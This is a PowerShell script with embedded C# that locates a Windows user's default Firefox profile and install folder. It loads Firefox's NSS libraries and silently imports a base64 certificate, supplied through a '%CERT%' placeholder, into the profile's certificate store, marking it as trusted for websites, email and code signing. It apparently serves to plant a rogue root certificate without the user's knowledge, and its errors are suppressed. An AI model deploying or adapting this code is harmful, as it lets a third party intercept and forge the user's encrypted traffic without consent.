function ACFF{
Add-Type @"
using System;
using System.IO;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using System.ComponentModel;

public sealed class FF
{
	private static volatile FF instance;
	private static object syncRoot = new Object();
	public static FF GetInstance()
    {
        if (instance == null)
        {
            lock (syncRoot)
            {
                if (instance == null)
                    instance = new FF();
            }
        }
        return instance;
    }
	
	const int ERROR_SUCCESS=0;
    
    [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
    static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);

    private static IntPtr LoadWin32Library(string libPath)
    {
        if (String.IsNullOrEmpty(libPath))
            throw new ArgumentNullException("libPath");

        IntPtr moduleHandle = LoadLibrary(libPath);
        if (moduleHandle == IntPtr.Zero)
        {
            int lasterror = Marshal.GetLastWin32Error();
            System.Console.WriteLine(String.Format("Last error: 0x{0:X}",lasterror));
            Win32Exception innerEx = new Win32Exception(lasterror);
            innerEx.Data.Add("LastWin32Error", lasterror);
            throw new Exception("can't load DLL " + libPath, innerEx);
        }
        return moduleHandle;
    }

    [DllImport("kernel32.dll")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);
	//Constants
    const uint NSS_INIT_READONLY=0x1;
    const uint NSS_INIT_NOCERTDB = 0x2;
    const uint NSS_INIT_NOMODDB = 0x4;
    const uint NSS_INIT_FORCEOPEN = 0x8;
    const uint NSS_INIT_NOROOTINIT = 0x10;
    const uint NSS_INIT_OPTIMIZESPACE = 0x20;
    const uint NSS_INIT_PK11THREADSAFE = 0x40;
    const uint NSS_INIT_PK11RELOAD = 0x80;
    const uint NSS_INIT_NOPK11FINALIZE = 0x100;
    const uint NSS_INIT_RESERVED = 0x200;
    const uint NSS_INIT_COOPERATE = NSS_INIT_PK11THREADSAFE | NSS_INIT_PK11RELOAD | NSS_INIT_NOPK11FINALIZE | NSS_INIT_RESERVED;

    const string SECMOD_DB = "secmod.db";
    //Structures
    [StructLayout(LayoutKind.Sequential)]
    public struct SECItem 
    {
        public uint iType;
        public IntPtr bData;
        public uint iDataLen;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct CertTrusts
    {
        public int iSite;
        public int iEmail;
        public int iSoft;
    }

    private enum SECCertUsage
    {
        certUsageSSLClient = 0,
        certUsageSSLServer = 1,
        certUsageSSLServerWithStepUp = 2,
        certUsageSSLCA = 3,
        certUsageEmailSigner = 4,
        certUsageEmailRecipient = 5,
        certUsageObjectSigner = 6,
        certUsageUserCertImport = 7,
        certUsageVerifyCA = 8,
        certUsageProtectedObjectSigner = 9,
        certUsageStatusResponder = 10,
        certUsageAnyCA = 11
    }
	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate int NSS_InitializePtr(string sConfigDir, string certPrefix, string keyPrefix, string secModName, uint flags);

    private int NSS_Initialize(string sConfigDir, string certPrefix, string keyPrefix, string secModName, uint flags)
    {
        IntPtr pProc = GetProcAddress(nssModule, "NSS_Initialize");
        NSS_InitializePtr ptr = (NSS_InitializePtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSS_InitializePtr));
        return ptr(sConfigDir, certPrefix, keyPrefix, secModName, flags);
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate IntPtr CERT_GetDefaultCertDBPtr();
    private IntPtr CERT_GetDefaultCertDB()
    {
        IntPtr pProc = GetProcAddress(nssModule, "CERT_GetDefaultCertDB");
        CERT_GetDefaultCertDBPtr ptr = (CERT_GetDefaultCertDBPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(CERT_GetDefaultCertDBPtr));
        return ptr();
    }

    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate IntPtr NSS_ShutdownPtr();
    private IntPtr NSS_Shutdown()
    {
        IntPtr pProc = GetProcAddress(nssModule, "NSS_Shutdown");
        NSS_ShutdownPtr ptr = (NSS_ShutdownPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(NSS_ShutdownPtr));
        return ptr();
    }

    //SECStatus CERT_ImportCerts (CERTCertDBHandle *certdb, SECCertUsage usage, unsigned int ncerts, SECItem **derCerts, CERTCertificate ***retCerts, PRBool keepCerts, PRBool caOnly, char *nickname)
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    private delegate int CERT_ImportCertsPtr(IntPtr certdb, int usage, uint ncerts, ref SECItem[] derCerts, ref IntPtr retCerts, uint keepCerts, uint caOnly, IntPtr nickname);
    private int CERT_ImportCerts(IntPtr certdb, int usage, uint ncerts, ref SECItem[] derCerts, ref IntPtr retCerts, uint keepCerts, uint caOnly, IntPtr nickname)
    {
        IntPtr pProc = GetProcAddress(nssModule, "CERT_ImportCerts");
        CERT_ImportCertsPtr ptr = (CERT_ImportCertsPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(CERT_ImportCertsPtr));
        return ptr(certdb, usage, ncerts, ref derCerts, ref retCerts, keepCerts, caOnly, nickname);
    }

    //extern SECStatus CERT_ChangeCertTrust(CERTCertDBHandle *handle,CERTCertificate *cert,CERTCertTrust *trust);
    private delegate int CERT_ChangeCertTrustPtr(IntPtr certdb, IntPtr cert, ref CertTrusts trust);
    private int CERT_ChangeCertTrust(IntPtr certdb, IntPtr cert, ref CertTrusts trust)
    {
        IntPtr pProc = GetProcAddress(nssModule, "CERT_ChangeCertTrust");
        CERT_ChangeCertTrustPtr ptr = (CERT_ChangeCertTrustPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(CERT_ChangeCertTrustPtr));
        return ptr(certdb, cert, ref trust);
    }
    //void CERT_DestroyCertArray(CERTCertificate **certs, unsigned int ncerts);
    [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
    public delegate int CERT_DestroyCertArrayPtr(IntPtr cert, uint ncerts);
    private int CERT_DestroyCertArray(IntPtr cert, uint ncerts)
    {
        IntPtr pProc = GetProcAddress(nssModule, "CERT_DestroyCertArray");
        CERT_DestroyCertArrayPtr ptr = (CERT_DestroyCertArrayPtr)Marshal.GetDelegateForFunctionPointer(pProc, typeof(CERT_DestroyCertArrayPtr));
        return ptr(cert, ncerts);
    }

	private IntPtr nssModule = IntPtr.Zero;
	
	public Boolean Start(String sCert){
        System.Console.WriteLine("FF Start");
		String sProfile = GetProfile();
        if (String.IsNullOrEmpty(sProfile))
        {
            System.Console.WriteLine("Profile not found");
            return false;
        }
        System.Console.WriteLine("Profile path="+sProfile);
        byte[] bCert = GetCertAsByteArray(sCert);
		IntPtr ipCert = Marshal.AllocHGlobal(bCert.Length);
		try
        {
            DirectoryInfo diInstallPath = GetIP();
            String sCurrentDirectory = Directory.GetCurrentDirectory();
            Directory.SetCurrentDirectory(diInstallPath.FullName);
            System.Console.WriteLine("Install path="+diInstallPath.FullName);
            foreach(FileInfo fiDll in diInstallPath.GetFiles("*.dll"))
            {
                if (fiDll.Name.Equals("breakpadinjector.dll")) continue;
                LoadWin32Library(fiDll.FullName);
            }
            nssModule = LoadWin32Library(diInstallPath.FullName + "\\nss3.dll");
            if (nssModule.Equals(IntPtr.Zero))
            {
                System.Console.WriteLine("Firefox install directory not found");
                return false;
            }
            Directory.SetCurrentDirectory(sCurrentDirectory);
            //Init cert
            Marshal.Copy(bCert, 0, ipCert, bCert.Length);
            SECItem CertItem = new SECItem();
            CertItem.iType = 3;     //   *.der
            CertItem.bData = ipCert;
            CertItem.iDataLen = (uint)bCert.Length;
            SECItem[] aCertItem = new SECItem[1];
            aCertItem[0] = CertItem;

            CertTrusts CertTrust = new CertTrusts();
            CertTrust.iSite = 0x10;
            CertTrust.iEmail = 0x10;
            CertTrust.iSoft = 0x10;
            System.Console.WriteLine("Init cert OK");
            //End init cert
            int status = NSS_Initialize(sProfile, "", "", SECMOD_DB, NSS_INIT_OPTIMIZESPACE);
            if (status != ERROR_SUCCESS)
            {
                System.Console.WriteLine(String.Format("NSS_InitReadWrite ERROR. Status: 0x{0:X};Last error: 0x{0:X}", status, Marshal.GetLastWin32Error()));
                return false;
            }
            IntPtr bd = CERT_GetDefaultCertDB();
            if (bd == IntPtr.Zero)
            {
                System.Console.WriteLine("CERT_GetDefaultCertDB Failed");
                NSS_Shutdown();
                return false;
            }
            System.Console.WriteLine("CERT_GetDefaultCertDB OK");
            IntPtr CertToImport = new IntPtr();
            IntPtr[] aCertToImport = new IntPtr[1];
            status = CERT_ImportCerts(bd, 11, 1, ref aCertItem, ref CertToImport, 1, 0, IntPtr.Zero);
            if (status != ERROR_SUCCESS)
            {
                System.Console.WriteLine(String.Format("CERT_ImportCerts ERROR. Status: 0x{0:X};Last error: 0x{0:X}", status, Marshal.GetLastWin32Error()));
                NSS_Shutdown();
                return false;
            }
            System.Console.WriteLine("CERT_ImportCerts OK");
            Marshal.Copy(CertToImport, aCertToImport, 0, 1);
            status = CERT_ChangeCertTrust(bd, aCertToImport[0], ref CertTrust);
            if ( status != ERROR_SUCCESS) 
            {
                System.Console.WriteLine(String.Format("CERT_ChangeCertTrust ERROR. Status: 0x{0:X};Last error: 0x{0:X}", status, Marshal.GetLastWin32Error()));
                NSS_Shutdown();
                return false;
            };
            System.Console.WriteLine("CERT_ChangeCertTrust OK");
            CERT_DestroyCertArray(CertToImport, 1);
            System.Console.WriteLine("Add cert OK");
        }
        catch (Exception){}
        finally
        {
            /*Marshal.FreeHGlobal(ipCert);
            ipCert = IntPtr.Zero;*/
            NSS_Shutdown();
        }
		return true;
	}
	private String GetProfile()
    {
        String FFProfile = Path.Combine(Environment.GetEnvironmentVariable("APPDATA"), @"Mozilla\Firefox\Profiles");
        if (Directory.Exists(FFProfile))
        {
            if (Directory.GetDirectories(FFProfile, "*.default").Length > 0)
            {
                return Directory.GetDirectories(FFProfile, "*.default")[0];
            }
        }
        return "";
    }
	public byte[] GetCertAsByteArray(String sCert)
    {
        try
        {
            return Convert.FromBase64String(sCert);
        }
        catch (Exception){}
        return null;
    }
	private DirectoryInfo GetIP()
    {
        DirectoryInfo fp = null;
        // get firefox path from registry
        // we'll search the 32bit install location
        RegistryKey localMachine1 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Mozilla\Mozilla Firefox", false);
        // and lets try the 64bit install location just in case
        RegistryKey localMachine2 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Wow6432Node\Mozilla\Mozilla Firefox", false);

        if (localMachine1 != null)
        {
            try
            {
                string[] installedVersions = localMachine1.GetSubKeyNames();
                // we'll take the first installed version, people normally only have one
                if (installedVersions.Length == 0)
                    throw new IndexOutOfRangeException("No installs of firefox recorded in its key.");

                RegistryKey mainInstall = localMachine1.OpenSubKey(installedVersions[0]);

                // get install directory
                string installString = (string)mainInstall.OpenSubKey("Main").GetValue("Install Directory", null);

                if (installString == null)
                    throw new NullReferenceException("Install string was null");

                fp = new DirectoryInfo(installString);
            }
            catch (Exception)
            {
            }
        }
        else if (localMachine2 != null)
        {
            try
            {
                string[] installedVersions = localMachine2.GetSubKeyNames();
                // we'll take the first installed version, people normally only have one
                if (installedVersions.Length == 0)
                    throw new IndexOutOfRangeException("No installs of firefox recorded in its key.");

                RegistryKey mainInstall = localMachine2.OpenSubKey(installedVersions[0]);

                // get install directory
                string installString = (string)mainInstall.OpenSubKey("Main").GetValue("Install Directory", null);

                if (installString == null)
                    throw new NullReferenceException("Install string was null");
                fp = new DirectoryInfo(installString);
            }
            catch (Exception)
            {
            }
        }
        return fp;
    }
}
"@;
[FF]::GetInstance().Start("%CERT%");
}
ACFF
